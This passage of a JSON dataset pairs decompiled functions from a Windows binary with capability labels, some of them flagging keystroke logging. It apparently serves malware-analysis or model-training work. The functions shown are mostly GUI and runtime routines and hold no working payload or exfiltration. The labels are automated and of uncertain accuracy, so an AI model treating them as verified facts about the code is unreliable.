        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d7cc(uint arg_8h, int32_t arg_ch, uint noname_2, int16_t *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.0040d7cc::var_1h + 1;\n    uStack24 = 0x40d839;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.004080cc();\n        *arg_14h = -(var_1h != '\\0');\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d840;\n    uStack24 = 0x40d838;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 257
    },
    "0040d92c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d92c(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x40d990;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00408168();\n        fcn.004047d4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d997;\n    uStack20 = 0x40d98f;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 220
    },
    "0040fe08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040fe08(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0040ea48();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "00413e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00413e48(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x413e5a;\n    fcn.00413ed0();\n    uStack20 = 0x413ec4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.00413bc0();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.00413af0();\n            }\n            goto code_r0x00413eae;\n        }\n    }\n    fcn.00413a08();\ncode_r0x00413eae:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x413ecb;\n    uStack20 = 0x413ec3;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 289
    },
    "00419838": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419838(char param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.0041981c();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar3 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar3) {\n            piVar2 = fcn.00413b64();\n            (**(*piVar2 + 0x10))();\n            iVar3 = iVar3 + -1;\n            iVar1 = *(*(in_EAX + 0x10) + 8);\n            if (iVar1 <= iVar3) {\n                iVar3 = iVar1 + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "0041c668": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c668(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x461418;\n    piVar3 = param_2;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 9) = *(param_2 + 9) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 8;\n            }\n            *(param_2 + 10) = uStack97;\n            fcn.00402d64();\n            fcn.00402b54();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 2) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 2) = 1;\n            }\n            else {\n                *(param_2 + 2) = 0;\n            }\n            *param_2 = in_EAX;\n        }\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "0041d0bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041d0bc(void)\n\n{\n    fcn.0041d024();\n    fcn.0041d040();\n    return;\n}\n",
        "token_count": 35
    },
    "0041d1d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041d1d8(void)\n\n{\n    fcn.0041d024();\n    fcn.0041d040();\n    return;\n}\n",
        "token_count": 36
    },
    "00420734": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00420734(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.004157bc();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 153
    },
    "00420794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420794(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.0042020c();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00403228();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.00420ee0();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.00420edc();\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "00422008": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00422008(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 100
    },
    "00422acc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422acc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x422aec;\n        fcn.004220fc();\n        puStack108 = 0x422afb;\n        fcn.00402c64();\n        if (param_2 != 0) {\n            puStack108 = &fcn.00422acc::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x422b0b;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x46388c) {\n            var_4h = *0x46388c;\n        }\n        else {\n            puStack120 = 0x422b38;\n            var_4h = fcn.00421714();\n        }\n        uStack124 = 0x422b67;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.004223cc(0, 0, &fcn.00422acc::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "00422d1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422d1c(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.0042210c();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack60 = uStack80;\n        uStack58 = uStack80;\n        fcn.00421b18(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00422d9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422d9c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uchar auStackY256 [116];\n    uint uStackY140;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.0041bb60();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.004220fc();\n            fcn.0042210c();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.00422d9c::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x422e02;\n            var_4h = fcn.004210b0(0, &fcn.00422d9c::var_58h);\n            uStack120 = 0x422e33;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            uStackY140 = 0x422e29;\n            puStack116 = &stack0xfffffffc;\n            fcn.004223cc(0, &stack0xffffff00 | *(iVar1 + 0x70), &fcn.00422d9c::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.00420fa8();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 518
    },
    "00422e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422e70(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != in_EAX[0xd]) {\n        if (param_2 == 0x20000000) {\n            *(in_EAX + 0xe) = 0;\n        }\n        else {\n            *(in_EAX + 0xe) = 1;\n        }\n        in_EAX[0xd] = param_2;\n        iVar1 = in_EAX[10];\n        if (1 < *(iVar1 + 4)) {\n            fcn.0042210c();\n            fcn.00421b18(iVar1 + 0x18);\n        }\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00427e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00427e48(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00427870();\n    return iVar1 != 0;\n}\n",
        "token_count": 40
    },
    "0042a550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a550(int32_t arg_8h)\n\n{\n    char in_AL;\n    \n    *(arg_8h + -4) = 0xff000014;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -4) = 0xff000010;\n    }\n    *(arg_8h + -8) = 0xff000010;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -8) = 0xff000014;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0042ca28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ca28(uint32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint lprc;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    lprc = *arg_10h;\n    uStack16 = arg_10h[1];\n    uStack12 = arg_10h[2];\n    uStack8 = arg_10h[3];\n    fcn.0041d1d8();\n    if (arg_ch == '\\x01') {\n        sub.user32.dll_OffsetRect(&lprc, 1, 1);\n        fcn.0041c8f0();\n        uVar1 = fcn.00404268(&lprc, arg_8h | 5);\n        uVar1 = fcn.00404468(uVar1);\n        uVar1 = fcn.0041d804(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n        sub.user32.dll_OffsetRect(&lprc, 0xffffffff, 0xffffffff);\n        fcn.0041c8f0();\n        uVar1 = fcn.00404268(&lprc, arg_8h | 5);\n        uVar1 = fcn.00404468(uVar1);\n        uVar1 = fcn.0041d804(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n    }\n    else {\n        uVar1 = fcn.00404268(&lprc, arg_8h | 5);\n        uVar1 = fcn.00404468(uVar1);\n        uVar1 = fcn.0041d804(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "00433b34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433b34(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x433c1f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = 0x433b66;\n    cVar1 = fcn.00433dac();\n    if (cVar1 != '\\0') {\n        if ((((arg_ch == 0x102) || (arg_ch == 0x105)) || (arg_ch == 0x201)) ||\n           (((arg_ch == 10 || (arg_ch == 8)) || ((arg_ch == 1 || (arg_ch == 0x101)))))) {\n            arg_8h_00 = 0;\n            fcn.00407e50();\n            cVar1 = fcn.00433d04(arg_8h_00);\n        }\n        else {\n            cVar1 = '\\x01';\n        }\n        if (cVar1 != '\\0') {\n            *(in_EAX + 0x10) = 1;\n            fcn.00407e50();\n            fcn.00403ffc();\n            fcn.00433468(arg_ch, arg_8h);\n            uVar2 = fcn.00404468();\n            sub.user32.dll_WinHelpA(in_EDX, uVar2);\n        }\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x433c26;\n    uStack48 = 0x433c1e;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 464
    },
    "00437038": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00437038(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0043fd08();\n        uVar2 = fcn.0043fd08(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 119
    },
    "0043736c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0043736c(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x463b30 + 4) != 0) {\n        iVar1 = fcn.00437238(*0x463b30 + 0xc, *(*0x463b30 + 4));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 102
    },
    "004389fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004389fc(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.00419838();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x1f]) {\n            fcn.004394e4();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.004388a0();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0043cb2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cb2c(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00439b64();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.00439b94();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.00403454();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00403454();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.00403454();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "004417d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004417d8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.0044666c();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.0044183c();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.004415c8(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 203
    },
    "00441860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00441860(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.0044666c();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.004415c8(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 169
    },
    "00441b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00441b40(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00441bd0();\n        }\n        else {\n            fcn.0040b538();\n            fcn.004039e4();\n        }\n        return;\n    }\n    fcn.00441bd0();\n    return;\n}\n",
        "token_count": 150
    },
    "00441b88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00441b88(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00441c3c();\n        }\n        else {\n            fcn.0040b538();\n            fcn.004039e4();\n        }\n        return;\n    }\n    fcn.00441c3c();\n    return;\n}\n",
        "token_count": 152
    },
    "00442110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442110(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x442125;\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x442138;\n    fcn.00403228();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x40000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x442188;\n    iVar2 = fcn.00441ab8();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x44219a;\n    iVar2 = fcn.0041cf14();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x4421ae;\n    fcn.00423b70();\n    puStack48 = 0x4421b7;\n    fcn.0041d090();\n    puStack48 = 0x4421bf;\n    fcn.004422e0();\n    uStack52 = 0x44221c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.0043ca38();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0043c9fc(0);\n            (**(*in_EAX + 8))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00441cec();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x442223;\n    uStack52 = 0x44221b;\n    fcn.004422e4();\n    return;\n}\n",
        "token_count": 592
    },
    "00443ae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443ae8(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004445e8();\n    fcn.00443b9c();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.0044202c();\n    }\n    else {\n        fcn.0044202c();\n    }\n    fcn.00443a14();\n    fcn.004423b8(0x443b8c);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "00443b9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
